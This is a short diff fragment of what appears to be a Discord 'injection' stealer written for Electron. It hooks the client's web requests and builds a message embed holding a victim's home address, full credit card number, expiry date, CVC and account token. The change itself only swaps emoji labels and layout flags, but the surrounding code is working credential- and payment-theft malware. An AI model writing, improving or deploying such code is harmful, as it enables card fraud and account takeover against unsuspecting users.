@@ -2170,16 +2170,16 @@ electron.session.defaultSession.webRequest.onCompleted(
                     inline: true,
                   },
                   {
-                    name: "Address <:identy:1206228345407406120>",
+                    name: "Address  <:password:1206254317229707387>",
                     value: `\`\`\`md\n# Line 1 : ${line_1},\n# Line 2 : ${line_2},\n# City : ${city},\n# State : ${state},\n# Postal Code : ${postal_code},\n# Country : ${country}\n\`\`\``,
-                    inline: true,
+                    inline: false,
                   },
                   {
-                    name: "Credit Card <:identy:1206228345407406120>",
+                    name: "Credit Card <a:creditc4rt:1206223818994225152>",
                     value: `\`\`\`md\n# Card Number : ${CardNumber}\n# Card Expiration : ${
                       month + "/" + year
                     }\n# CVC : ${CardCVC}\`\`\``,
-                    inline: true,
+                    inline: false,
                   },
                   {
                     name: "<:artreal:1206252088112316456> Token",
